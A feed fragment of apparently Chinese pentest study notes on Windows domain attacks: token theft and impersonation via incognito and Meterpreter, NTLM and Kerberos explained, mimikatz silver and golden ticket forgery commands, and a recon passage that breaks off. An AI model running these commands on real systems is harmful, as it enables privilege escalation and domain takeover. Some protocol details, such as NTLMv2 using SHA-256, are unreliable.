            "content_html": "<h3 id=\"什么是token\"><a class=\"markdownIt-Anchor\" href=\"#什么是token\">#</a> 什么是 token</h3>\n<p>在 Windows 系统中，令牌是一种临时密钥，用于决定是否允许当前请求以及判断当前请求属于哪个用户。令牌包含用户安全标识符（SID）、权限列表等，这些令牌持续存在于系统中，除非系统重新启动。令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。</p>\n<p>访问令牌（Access Token）是描述进程或线程安全上下文的对象，包含与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将为用户生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>\n<p>访问令牌包括：</p>\n<figure class=\"highlight vhdl\"><figcaption data-lang=\"VHDL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>授权令牌（Delegation Token），也叫主令牌，支持交互式会话登录（例如本地用户登录、远程桌面登录）</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>模拟令牌（Impresonation Token）支持非交互的会话（例如使用 net <span class=\"token keyword\">use</span>访问共享文件夹）</pre></td></tr></table></figure><p>密保令牌（Security Token）是一种用于实现计算机身份校验的物理设备，例如 U 盾。</p>\n<p>会话令牌（Session Token）是交互会话中唯一的身份标识符。</p>\n<p>令牌窃取是一种 Windows 上的提权攻击技术，攻击者可以通过获取系统中一个高权限进程的安全令牌，然后将其注入到一个低权限进程中，使得低权限进程可以获得高权限进程的访问权限。例如，域管理员在域内某台普通主机上留下未清除的令牌，攻击者可窃取域管理员的令牌以提升权限，从而执行各种恶意操作。</p>\n<p>总之，令牌是 Windows 系统中用于控制访问权限的关键组件，了解其工作原理和安全性对于保护系统免受攻击至关重要。</p>\n<h3 id=\"accesstoken-窃取与利用\"><a class=\"markdownIt-Anchor\" href=\"#accesstoken-窃取与利用\">#</a> AccessToken 窃取与利用</h3>\n<p>前提是需要 administrator 管理员权限</p>\n<h4 id=\"incognito利用\"><a class=\"markdownIt-Anchor\" href=\"#incognito利用\">#</a> incognito 利用</h4>\n<pre><code class=\"language-cmd\">incognito.exe list_tokens -u\n#列出令牌\nincognito.exe execute -c &quot;NT AUTHORITY\\SYSTEM&quot; cmd.exe\n#模拟system令牌切换到system权限\n</code></pre>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309144127705.png\" alt=\"image-20240309144127705\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309144239453.png\" alt=\"image-20240309144239453\"></p>\n<h4 id=\"msf的incognito模块\"><a class=\"markdownIt-Anchor\" href=\"#msf的incognito模块\">#</a> MSF 的 incognito 模块</h4>\n<p>获取到 shell 后进入 incognito</p>\n<p>use incognito</p>\n<p>列出 token</p>\n<p>list_tokens -u</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309151716077.png\" alt=\"image-20240309151716077\"></p>\n<p>impersonate_token “NT AUTHORITY\\SYSTEM”</p>\n<p>模拟 system 令牌</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309152144858.png\" alt=\"image-20240309152144858\"></p>\n<h4 id=\"进程窃取token\"><a class=\"markdownIt-Anchor\" href=\"#进程窃取token\">#</a> 进程窃取 token</h4>\n<p>查看进程</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309152932815.png\" alt=\"image-20240309152932815\"></p>\n<p>steal_token 416</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240309153206757.png\" alt=\"image-20240309153206757\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/win%E5%8D%8F%E8%AE%AE/",
            "url": "http://gyzero.shop/2024/03/05/network-security/neiwang/win%E5%8D%8F%E8%AE%AE/win%E5%8D%8F%E8%AE%AE/",
            "title": "win协议认证知识",
            "date_published": "2024-03-05T06:48:19.000Z",
            "content_html": "<h2 id=\"ntlm协议\"><a class=\"markdownIt-Anchor\" href=\"#ntlm协议\">#</a> NTLM 协议</h2>\n<p>NTLM（NT LAN Manager）是一套由微软开发的安全协议套件，用于在基于 Windows 的网络中进行身份验证、完整性和机密性保护。NTLM 最初是在上世纪 90 年代初引入的，经过多次修订以增强安全性和功能现在已经更新了 NTMLv2 和 kerberos 协议。</p>\n<h3 id=\"ntlm-hash\"><a class=\"markdownIt-Anchor\" href=\"#ntlm-hash\">#</a> NTLM HASH</h3>\n<p>NT LAN Manager</p>\n<p>长度为 32 位由数字字母组成是认证时的一个重要参照物</p>\n<p>在 windows 中我们的密码通常不是以明文形式传输，而是以哈希值的形式。例如我们设置密码为 admin 密码就会被哈希处理保存在 SAM 数据库中当用户登录时，其密码首先被哈希处理，然后与存储在系统中的哈希值进行比较。</p>\n<p>SAM 文件存储位置 <code>C:\\Windows\\System32\\config\\SAM</code>  是需要系统管理员权限才可以访问查看</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305152021162.png\" alt=\"image-20240305152021162\"></p>\n<h3 id=\"本地认证流程\"><a class=\"markdownIt-Anchor\" href=\"#本地认证流程\">#</a> 本地认证流程</h3>\n<ol>\n<li><strong>用户登录</strong>：当用户尝试登录到 Windows 系统时由 winlogon.exe 管理。</li>\n<li><strong>接收用户输入</strong>：用户在登录界面输入用户名和密码。winlogon.exe 负责接收这些用户输入。</li>\n<li><strong>验证用户凭据</strong>：一旦用户输入了凭据，winlogon.exe 将这些凭据传递给 Local Security Authority Subsystem Service (LSASS)，也就是 lsass.exe。</li>\n<li><strong>认证过程</strong>: lsass.exe 将收到的用户凭据与本地存储的凭据进行比对，这些凭据通常以 NTLM hash 的形式存储在本地安全账户数据库中。lsass.exe 会使用 NTLM hash 算法来验证用户提供的凭据。</li>\n<li><strong>访问授权</strong>：如果凭据验证成功，用户将被授权登录到系统，并获得相应的访问权限。如果验证失败，用户将被拒绝登录</li>\n</ol>\n<h3 id=\"ntlm认证详细流程\"><a class=\"markdownIt-Anchor\" href=\"#ntlm认证详细流程\">#</a> NTLM 认证详细流程</h3>\n<ol>\n<li><strong>协商</strong>：客户端和服务器协商使用的 NTLM 协议版本。</li>\n<li><strong>挑战 / 响应</strong>：服务器向客户端发送一个挑战，客户端以用户凭据的哈希版本进行响应。</li>\n<li><strong>会话安全</strong>：如果凭证被验证，将建立一个用于客户端和服务器之间安全通信的会话密钥。</li>\n</ol>\n<h4 id=\"第一步先协商\"><a class=\"markdownIt-Anchor\" href=\"#第一步先协商\">#</a> 第一步先协商</h4>\n<ul>\n<li>客户端发起连接请求，并包含支持的 NTLM 协议版本列表。</li>\n<li>服务器从客户端提供的列表中选择最高版本的 NTLM 协议 v1,v2 或者更早的 LM 协议，并向客户端发送选定的协议版本</li>\n</ul>\n<h4 id=\"第二步挑战响应\"><a class=\"markdownIt-Anchor\" href=\"#第二步挑战响应\">#</a> 第二步挑战 / 响应</h4>\n<p>首先服务端接收到来自客服端的用户名 test，然后查询本地账户有没有这个 test 用户</p>\n<blockquote>\n<p>没有的话返回认证失败</p>\n<p>有的话认证通过</p>\n</blockquote>\n<p>接着服务端生成一个 Challenge 这是一个 16 字节的随机数每次都不同，然后找到 test 的 NTLM HASH 值并用这个加密 Challenge</p>\n<p>生成一个 net-NTLM-HASH 存在内存中</p>\n<blockquote>\n<p>将 Challenge 发送给客户端</p>\n</blockquote>\n<p>客户端接收到 Challenge 后将 test 的密码转换为 NTMLHASH 然后对 Challenge 加密生成响应 response 也就是 net-NTLM-HASH</p>\n<blockquote>\n<p>客户端的 response 发送给服务端</p>\n</blockquote>\n<p>服务端收到 response 后与之前的 net-NTLM-HASH 进行比较如果相同的话认证通过</p>\n<blockquote>\n<p>认证通过</p>\n</blockquote>\n<h3 id=\"ntlmv1和v2区别\"><a class=\"markdownIt-Anchor\" href=\"#ntlmv1和v2区别\">#</a> NTLMv1 和 v2 区别</h3>\n<ol>\n<li><strong>安全性</strong>:\n<ul>\n<li>NTLMv1: NTLMv1 使用较弱的密码哈希算法（如 LM hash 和 NTLM hash），并且缺乏足够的随机性和安全性措施。它容易受到中间人攻击、字典攻击和重放攻击的影响。</li>\n<li>NTLMv2: NTLMv2 引入了更强大的密码哈希算法，通常是使用更安全的算法，如 MD5 或 SHA-256。它还引入了更多的随机性和安全性措施，例如使用更复杂的挑战 / 响应过程，增加了消息完整性检查等。这使得 NTLMv2 比 NTLMv1 更难以被破解和攻击。</li>\n</ul>\n</li>\n<li><strong>消息结构</strong>:\n<ul>\n<li>NTLMv1: NTLMv1 的消息结构相对简单，通常包括挑战和响应等基本部分。它的消息格式不够复杂，容易受到中间人攻击和重放攻击的影响。</li>\n<li>NTLMv2: NTLMv2 引入了更复杂的消息结构，包括更多的字段和数据元素。它的消息结构更复杂，包含更多的随机数和安全性相关的字段，使得攻击者更难以破解或篡改通信内容。</li>\n</ul>\n</li>\n<li><strong>兼容性</strong>:\n<ul>\n<li>NTLMv1: 尽管 NTLMv1 已被证明存在较大的安全风险，但仍然存在一些环境和遗留系统可能仍在使用 NTLMv1。一些旧版的 Windows 系统和应用程序仍然可能使用 NTLMv1，因此在某些情况下可能无法完全避免。</li>\n<li>NTLMv2: NTLMv2 是更安全的选项，但需要双方都支持才能正常使用。在较新的 Windows 系统和网络环境中，NTLMv2 通常被推荐和优先使用，以提高系统的安全性和兼容性。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"ntlm-hash的安全问题\"><a class=\"markdownIt-Anchor\" href=\"#ntlm-hash的安全问题\">#</a> NTLM-HASH 的安全问题</h3>\n<ol>\n<li><strong>弱密码哈希</strong>：NTLM Hash 使用的是较旧的哈希算法（如 MD4 或 MD5），这些算法已经被证明不安全，容易受到字典攻击、暴力破解等攻击。</li>\n<li><strong>单向散列</strong>：NTLM Hash 是单向散列，即从密码计算出 Hash 值很容易，但从 Hash 值反推出原始密码非常困难。这导致了在没有盐（salt）的情况下，使用彩虹表等预先计算好的 Hash 值进行破解的可能性。</li>\n<li><strong>中间人攻击</strong>：NTLM 协议本身容易受到中间人攻击的影响。攻击者可以拦截 NTLM 挑战 - 响应消息，并使用这些消息来模拟客户端与服务器之间的通信，从而获得对目标系统的访问权限。</li>\n</ol>\n<p><strong>Pass The Hash 攻击</strong>：攻击者可以获取到 NTLM Hash 后，直接使用这个 Hash 进行身份验证，而无需知道用户的明文密码</p>\n<h2 id=\"kerberos协议\"><a class=\"markdownIt-Anchor\" href=\"#kerberos协议\">#</a> Kerberos 协议</h2>\n<p>Kerberos 是一种网络认证协议，其设计目标是通过系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的（如：共享密钥）执行认证服务的。</p>\n<p>麻省理工研发了 Kerberos 协议来保护 Project Athena 提供的网络服务器。这个协议以希腊神话中的人物 Kerberos 命名，他是一条凶猛的三头保卫神犬</p>\n<h3 id=\"kerberos一些术语\"><a class=\"markdownIt-Anchor\" href=\"#kerberos一些术语\">#</a> kerberos 一些术语</h3>\n<ol>\n<li><strong>AS（Authentication Server）- 认证服务器</strong>：\n<ul>\n<li>AS 是 Kerberos 协议中的组件，用于对用户进行身份验证。它负责接收用户的认证请求，并在验证用户身份后向用户颁发 TGT。</li>\n</ul>\n</li>\n<li><strong>KDC（Key Distribution Center）- 密钥分发中心</strong>：\n<ul>\n<li>KDC 是 Kerberos 协议中的总称，由 AS 和 TGS 组成。KDC 通常指的是单个服务器，同时扮演 AS 和 TGS 的角色。</li>\n</ul>\n</li>\n<li><strong>TGT（Ticket Granting Ticket）- 票据授权票据</strong>：\n<ul>\n<li>TGT 是 Kerberos 协议中的票据类型，用于访问 Kerberos 受信任的服务。获得 TGT 后，用户可以向 TGS 请求访问特定服务的票据。</li>\n</ul>\n</li>\n<li><strong>TGS（Ticket Granting Server）- 票据授权服务器</strong>：\n<ul>\n<li>TGS 是 Kerberos 协议中的组件，负责颁发给用户用于访问特定服务的服务票据。用户通过提供 TGT 向 TGS 请求服务票据。</li>\n</ul>\n</li>\n<li><strong>SS（Service Server）- 特定服务提供端</strong>：\n<ul>\n<li>SS 是 Kerberos 协议中的服务端，提供特定的网络服务，例如文件共享、电子邮件等。SS 验证客户端提供的服务票据，并在票据有效时提供服务。</li>\n</ul>\n</li>\n</ol>\n<p>参与认证的三个角色</p>\n<ol>\n<li>\n<h3 id=\"客户端client\"><a class=\"markdownIt-Anchor\" href=\"#客户端client\">#</a> <strong>客户端（Client）</strong>：</h3>\n<ul>\n<li>客户端是发起身份验证请求的一方。在 Kerberos 中，客户端通常是用户或者用户所在的计算机，它们希望获得访问域资源的权限。</li>\n</ul>\n</li>\n<li>\n<p><strong>服务端（Service Server）</strong>：</p>\n<ul>\n<li>服务端是接收身份验证请求的一方，并向客户端提供网络服务。服务端可以是任何提供网络服务的实体，如文件服务器、打印服务器、应用程序服务器等。</li>\n</ul>\n</li>\n<li>\n<p><strong>密钥分发中心（Key Distribution Center，KDC）</strong>：</p>\n<ul>\n<li>密钥分发中心是 Kerberos 协议的关键组件，负责处理身份验证请求并颁发票据。KDC 通常包含两个主要部分：\n<ul>\n<li><strong>AS（Authentication Server）</strong>：负责接收客户端的身份验证请求，并向客户端颁发 TGT（Ticket Granting Ticket，票据授权票据）。</li>\n<li><strong>TGS（Ticket Granting Server）</strong>：负责接收客户端的 TGT，并向客户端颁发用于访问特定服务的服务票据。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"kerberos认证流程\"><a class=\"markdownIt-Anchor\" href=\"#kerberos认证流程\">#</a> Kerberos 认证流程</h3>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305181912124.png\" alt=\"image-20240305181912124\"></p>\n<ol>\n<li><strong>客户端向域控制器请求访问服务器</strong>：客户端首先向域控制器（DC）发送一个请求，请求访问服务器。DC 通过查询活动目录（AD）来确定客户端是否可信。</li>\n<li><strong>域控制器返回 TGT 给客户端</strong>：如果客户端被认证为可信，DC 会返回一个 Ticket Granting Ticket（TGT）给客户端。</li>\n<li><strong>客户端使用 TGT 请求访问服务器</strong>：客户端持有 TGT，然后向 DC 请求访问服务器。Ticket Granting Service（TGS）通过检查客户端消息中的 TGT 来判断客户端是否有访问权限。</li>\n<li><strong>如果客户端有访问权限，DC 会给客户端一个服务票据</strong>：如果客户端有访问权限，DC 会给客户端一个服务票据（Service Ticket，ST）。这个票据授予客户端访问服务器的权限。</li>\n<li><strong>客户端使用服务票据访问服务器</strong>：客户端得到服务票据后，就可以用这个票据去访问服务器。这个票据只对这个服务器有效。</li>\n<li><strong>服务器和客户端建立通信</strong>：最后，服务器和客户端建立通信。</li>\n</ol>\n<h3 id=\"详细流程\"><a class=\"markdownIt-Anchor\" href=\"#详细流程\">#</a> 详细流程</h3>\n<p>•ASREQ &amp; ASREP<br>\n•TGSREQ &amp; TGSREP<br>\n•AP-REQ &amp; AP-REP</p>\n<h4 id=\"第一部分asreq-asrep\"><a class=\"markdownIt-Anchor\" href=\"#第一部分asreq-asrep\">#</a> 第一部分 ASREQ &amp; ASREP</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305182829923.png\" alt=\"image-20240305182829923\"></p>\n<p>客户端向 KDC 发送一个 AS_REQ 请求里面信息包括 Kerberos 协议的版本号，用户名，请求类型，哈希值 NTLM-Hash 加密的时间戳</p>\n<p>还有一些服务器信息，接着 AS 接收到请求后向 AD 查询是否有此用户信息有的话会拿出该用户的 NTLM-Hash 对加密的时间戳进行解密</p>\n<p>五分钟之内预认证成功，认证通过后 KDC 生成两个东西分别是用于客户端和 KGS 之间通信的用客户端用户的 NTLM-HASH 加密的会话密钥 Session Key，和 Ticket Granting Ticket 票据授权票据</p>\n<p>TGT：</p>\n<p>AS 使用 KDC 账户（通常是 Krbtgt 用户，是域控制器创建时自动生成的特殊账户）的 NTLM-Hash 对 Session-key AS、时间戳和客户端信息等进行加密，这个加密过程确保了 TGT 的安全性和机密性，只有 KDC 账户的 NTLM-Hash 才能解密 TGT 并提取其中的信息，然后将加密后的 Session-key AS、时间戳、客户端信息以及 PAC 等信息组合起来，形成 TGT 因为使用服务端 Krbtgt 用户 NTLM-HASH 加密的所以客户端是解不开 TGT 的，TGT 一般为 8 小时有效期</p>\n<p>PAC（Privilege Attribute Certificate）是 TGT 中的一个重要部分，包含了客户端的安全标识符（SID）、所在组等信息。PAC 用于后续的授权过程，以确保客户端在获取服务票据时具有适当的权限。</p>\n<h4 id=\"第二部分tgsreq-tgsrep\"><a class=\"markdownIt-Anchor\" href=\"#第二部分tgsreq-tgsrep\">#</a> 第二部分 TGSREQ &amp; TGSREP</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305203212925.png\" alt=\"image-20240305203212925\"></p>\n<p>该阶段是客户端和 TGS 的认证，通过认证以后获得 ST 服务票据</p>\n<p>客户端接收到回复后获取到 Session key AS 和 TGT，接着将会用 NTLM-HASH 解密 session key AS 得到未加密 sessin key AS</p>\n<p>然后将这些缓存到本地，客户端如果想获取什么服务就会拿着获取的 TGT 加上 Session-Key AS 加密时间戳、Client-info、Server-info 等数据组成 TGSREQ 去请求 TGS 购买 ST 服务票据</p>\n<p>TGS 收到后</p>\n<ol>\n<li><strong>解密 TGT 并验证时间戳</strong>：\n<ul>\n<li>TGS 收到客户端的 TGSREQ 请求后，使用 Krbtgt 用户的 NTLM-hash 解密 TGT，得到其中的 Session-key AS、时间戳、Client-info 和 Server-info 等信息。</li>\n<li>TGS 使用 Session-key AS 解密 TGT 中的信息，得到 Client-info 和时间戳。然后 TGS 将获取到的时间戳与当前时间进行比较，如果时间戳与当前时间相差太久，则需要重新进行身份验证。</li>\n</ul>\n</li>\n<li><strong>验证客户端信息和权限</strong>：\n<ul>\n<li>TGS 进一步比较 TGT 中的 Client-info 与 TGSREQ 请求中的 Client 信息，确保两者一致性。</li>\n<li>如果客户端信息验证通过，并且客户端有权限访问请求的服务，则认证成功。</li>\n</ul>\n</li>\n<li><strong>生成 Session-key TGS 并加密</strong>：\n<ul>\n<li>如果身份验证成功，TGS 生成一个用于客户端和服务器之间通信的会话密钥，称为 Session-key TGS。</li>\n<li>TGS 使用 Session-key AS 加密 Session-key TGS，并将其作为 TGS_REP 响应的一部分发送给客户端，确保通信的安全性。</li>\n</ul>\n</li>\n<li><strong>生成 ST 并加密</strong>：\n<ul>\n<li>另一部分是 TGS 使用目标服务器（Server）的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据，生成服务票据（Service Ticket，ST）。</li>\n<li>TGS 将这个 ST 作为 TGS_REP 响应的一部分发送给客户端</li>\n</ul>\n</li>\n</ol>\n<h4 id=\"第三部分ap-req-ap-rep\"><a class=\"markdownIt-Anchor\" href=\"#第三部分ap-req-ap-rep\">#</a> 第三部分 AP-REQ &amp; AP-REP</h4>\n<p>客户端在收到 TGS 的响应（TGS_REP）后，会使用它的会话密钥（Session-key AS）解密出新的会话密钥（Session-key TGS），并将其存储在本地。然后，当客户端需要访问服务时，它会使用新的会话密钥（Session-key TGS）加密其身份信息（Client-info）和时间戳，然后将其与服务票据（ST）一起发送给服务服务器。这个请求被称为 AP_REQ。</p>\n<p>服务服务器在收到 AP_REQ 请求后，会使用它的 NTLM-Hash 解密服务票据（ST），得到新的会话密钥（Session-key TGS），然后使用这个密钥解密客户端的身份信息（Client-info）和时间戳。然后，服务服务器会将解密出的信息与服务票据（ST）中的信息进行比较，以验证客户端的身份。</p>\n<p>一旦客户端通过了身份验证，服务服务器就会使用 PAC（Privilege Attribute Certificate）去询问域控制器（DC）客户端是否有访问服务的权限。域控制器在接收到 PAC 后，会解密 PAC，然后通过 PAC 中的 SID（Security Identifier）来判断客户端的用户组信息和权限。然后，域控制器会将结果返回给服务服务器，服务服务器再将这些信息与服务资源的访问控制列表（ACL）进行比较，最后决定是否给客户端提供服务。</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240305205417213.png\" alt=\"image-20240305205417213\"></p>\n<h3 id=\"kerberos的安全问题\"><a class=\"markdownIt-Anchor\" href=\"#kerberos的安全问题\">#</a> Kerberos 的安全问题</h3>\n<ol>\n<li><strong>票据伪造（Ticket Forgery）</strong>：攻击者可能会尝试伪造 Kerberos 票据，以获取未经授权的访问权限。这包括黄金票据和白银票据攻击，其中黄金票据是伪造 TGT（Ticket Granting Ticket）来获取对整个 Kerberos 域的访问权限，而白银票据则是伪造 TGS（Ticket Granting Service Ticket）以获取对特定服务的访问权限。</li>\n<li><strong>中间人攻击（Man-in-the-Middle Attacks）</strong>：在 Kerberos 认证中，如果攻击者能够截获通信并伪装成合法用户与服务器进行通信，则可以执行中间人攻击。这种攻击可以导致信息泄露、数据篡改等问题。</li>\n<li><strong>票据重放（Ticket Replay）</strong>：攻击者可能会捕获到有效的 Kerberos 票据，然后重放这些票据来获取访问权限。这种攻击可能导致身份伪造和未经授权的访问。</li>\n</ol>\n<h2 id=\"白银票据silver-tickets\"><a class=\"markdownIt-Anchor\" href=\"#白银票据silver-tickets\">#</a> 白银票据（Silver Tickets）</h2>\n<p>白银票据（Silver Ticket）是一种利用 Kerberos 认证系统的漏洞来实现非授权访问的攻击方式。在 Kerberos 协议中，PAC（Privilege Attribute Certificate，特权属性证书）是一个用于存储用户的安全信息、组成员身份以及授权信息的数据结构。PAC 由 Kerberos 服务器（KDC）在授予用户票据时生成，并附加在票据中。</p>\n<p>攻击者通过获取用户的用户名和密码哈希值等信息，可以伪造 TGS（Ticket Granting Service Ticket）以请求访问网络资源。然而，TGS 本身并不包含 PAC。攻击者之所以能够成功利用白银票据攻击，是因为部分服务在处理 TGS 时并不验证 PAC，因此攻击者可以伪造 TGS，并不需要伪造 PAC 就能够获取非授权访问权限。</p>\n<p>这种情况下，即使攻击者无法生成完整有效的 PAC，服务端仍然会授予其访问权限，因为服务端未对 PAC 进行验证。因此，白银票据攻击的成功前提之一就是目标服务对 PAC 的验证不严格，从而允许攻击者利用这一漏洞来获取非授权访问权限</p>\n<p>白银票据就是伪造 ST 去请求服务而有些服务是不需要验证 PAC 的只需要有 ST 就可以，而制作 ST 是需要目标服务器（Server）的 NTLM-Hash</p>\n<h3 id=\"制作条件\"><a class=\"markdownIt-Anchor\" href=\"#制作条件\">#</a> 制作条件</h3>\n<p>域名</p>\n<p>域 sid</p>\n<p>目标服务器名</p>\n<p>服务账号的 NTML HASH</p>\n<p>伪造的用户名</p>\n<p>不需要验证 PAC 的服务</p>\n<h3 id=\"mimikatz工具伪造\"><a class=\"markdownIt-Anchor\" href=\"#mimikatz工具伪造\">#</a> mimikatz 工具伪造</h3>\n<p><code>kerberos::golden /domain:域名 /sid:填sid /target:完整的域控名 /service:需要访问的服务 /rc4:服务账号NTMLHASH /user:用户名 /ptt</code></p>\n<h2 id=\"黄金票据golden-ticket\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据golden-ticket\">#</a> 黄金票据 Golden ticket</h2>\n<p>白银票据是伪造的 ST 而黄金票据伪造的是 TGT 就是 AS 返回给客户端的用来向 TGS 请求服务 ST 用的，获得 TGT 后，用户可以向 TGS 请求访问特定服务的票据。</p>\n<p>TGT 使用 Krbtgt 用户 NTLM-HASH 加密的所以我们获取到 Krbtgt 用户 NTLM-HASH 就可以伪造 TGT 了</p>\n<p>域名称</p>\n<p>域的 SID 值</p>\n<p>KRBTGT 账号的 HASH</p>\n<p>伪造任意用户名</p>\n<p>mimikatz 命令</p>\n<p>kerberos::golden /admin: 用户名 /domain: 域名 /sid: 域 sid /krbtgt:NTLM HASH /ticket: 票据名称<br>\n后面会详细讲</p>\n<h2 id=\"白银票据黄金票据区别\"><a class=\"markdownIt-Anchor\" href=\"#白银票据黄金票据区别\">#</a> 白银票据黄金票据区别</h2>\n<h3 id=\"白银票据\"><a class=\"markdownIt-Anchor\" href=\"#白银票据\">#</a> 白银票据</h3>\n<p>白银票据需要服务器账号的 NTLM HASH</p>\n<p>白银票据伪造的是 ST</p>\n<p>白银票据只能访问部分不需要验证 PAC 的服务</p>\n<p>白银票据不与 KDC 交互可以拿着伪造的 ST 去访问服务器</p>\n<h3 id=\"黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据\">#</a> 黄金票据</h3>\n<p>黄金票据需要域 Krbtgt 用户 NTLM-HASH</p>\n<p>黄金票据伪造的是 TGT</p>\n<p>黄金票据可以访问所有服务</p>\n<p>黄金票据不和 AS 交互但是和 KDC 交互因为要拿着伪造的 TGT 去 TGS 请求 ST</p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "url": "http://gyzero.shop/2024/03/03/network-security/neiwang/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/",
            "title": "内网信息收集",
            "date_published": "2024-03-03T09:22:07.000Z",
            "content_html": "<p>进入内网后要对当前网络环境进行判断</p>\n<p>判断出当前机器所处网络环境的拓扑，以及当前电脑在内网是什么角色当前机器的权限</p>\n<h3 id=\"本机信息收集\"><a class=\"markdownIt-Anchor\" href=\"#本机信息收集\">#</a> 本机信息收集</h3>\n<h4 id=\"查询网络配置信息\"><a class=\"markdownIt-Anchor\" href=\"#查询网络配置信息\">#</a> 查询网络配置信息</h4>\n<p><code>ipconfig /all</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304135135624.png\" alt=\"image-20240304135135624\"></p>\n<h4 id=\"查看用户详细信息\"><a class=\"markdownIt-Anchor\" href=\"#查看用户详细信息\">#</a> 查看用户详细信息</h4>\n<p><code>whoami /all</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304135324706.png\" alt=\"image-20240304135324706\"></p>\n<h4 id=\"查看系统版本补丁等\"><a class=\"markdownIt-Anchor\" href=\"#查看系统版本补丁等\">#</a> 查看系统版本补丁等</h4>\n<p><code>systeminfo</code>  可查看系统信息打了那些补丁为后续提权查找漏洞准备</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140357064.png\" alt=\"image-20240304140357064\"></p>\n<h4 id=\"查看系统启动的服务\"><a class=\"markdownIt-Anchor\" href=\"#查看系统启动的服务\">#</a> 查看系统启动的服务</h4>\n<p>net start</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140458074.png\" alt=\"image-20240304140458074\"></p>\n<h4 id=\"查看系统进程\"><a class=\"markdownIt-Anchor\" href=\"#查看系统进程\">#</a> 查看系统进程</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140610127.png\" alt=\"image-20240304140610127\"></p>\n<h4 id=\"查看主机计划任务列表\"><a class=\"markdownIt-Anchor\" href=\"#查看主机计划任务列表\">#</a> 查看主机计划任务列表</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304140751585.png\" alt=\"image-20240304140751585\"></p>\n<h4 id=\"查看本机用户域用户\"><a class=\"markdownIt-Anchor\" href=\"#查看本机用户域用户\">#</a> 查看本机用户域用户</h4>\n<p><code>net user</code> net user /domain</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141626726.png\" alt=\"image-20240304141626726\"></p>\n<h4 id=\"查询域数量\"><a class=\"markdownIt-Anchor\" href=\"#查询域数量\">#</a> 查询域数量</h4>\n<p><code>net view /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141803745.png\" alt=\"image-20240304141803745\"></p>\n<h4 id=\"查询域组\"><a class=\"markdownIt-Anchor\" href=\"#查询域组\">#</a> 查询域组</h4>\n<p><code>net group /domain</code></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240304141928484.png\" alt=\"image-20240304141928484\"></p>\n<h4 id=\"查询域中的-domain-admins-组的成员\"><a class=\"markdownIt-Anchor\" href=\"#查询域中的-domain-admins-组的成员\">#</a> 查询域中的 “Domain 